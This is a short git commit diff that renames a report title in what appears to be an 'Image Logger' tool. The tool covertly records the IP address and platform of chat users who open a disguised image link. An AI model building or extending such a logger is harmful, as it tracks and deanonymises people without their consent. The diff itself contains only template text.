4978437c21ff2555f623a282c5b9504640a37a10
bklamheem <luvnone590@gmail.com>
2025-07-23 23:19:20 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -99,7 +99,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "Image Logger - (not real ip)",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
